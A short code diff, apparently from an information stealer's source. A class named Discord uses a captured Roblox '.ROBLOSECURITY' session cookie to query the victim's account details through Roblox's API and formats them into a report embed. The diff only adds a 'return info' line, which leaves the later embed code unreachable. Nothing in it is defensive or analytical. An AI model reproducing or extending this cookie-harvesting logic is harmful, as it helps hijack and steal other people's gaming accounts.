@@ -315,6 +315,7 @@ class Discord:
             headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
             try:
                 info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+                return info
             except Exception:
                 pass
             embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
